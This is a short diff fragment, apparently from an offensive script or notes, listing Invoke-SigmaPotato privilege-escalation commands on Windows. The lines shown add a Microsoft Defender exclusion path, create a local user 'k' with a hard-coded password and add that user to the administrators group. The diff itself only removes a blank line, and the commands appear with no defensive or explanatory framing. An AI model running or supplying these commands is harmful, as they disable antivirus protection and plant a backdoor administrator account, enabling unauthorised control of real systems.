@@ -79,4 +79,3 @@ Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\progr
 Invoke-SigmaPotato -command "net user k kopq@123 /add"
 Invoke-SigmaPotato -command "net localgroup administrators k /add"
 
-
